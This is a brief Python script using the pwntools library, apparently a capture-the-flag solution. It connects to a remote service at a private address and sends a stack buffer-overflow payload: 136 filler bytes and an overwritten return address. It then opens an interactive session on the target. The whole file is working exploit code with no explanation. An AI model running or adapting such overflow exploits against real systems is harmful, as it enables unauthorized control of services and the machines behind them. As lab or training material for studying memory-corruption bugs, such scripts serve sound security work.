from pwn import *
#p = process("./pwn")
p = remote("172.16.12.2",6666)
payload = b"a"*136 + p64(0x400586)
p.sendline(payload)
p.interactive()
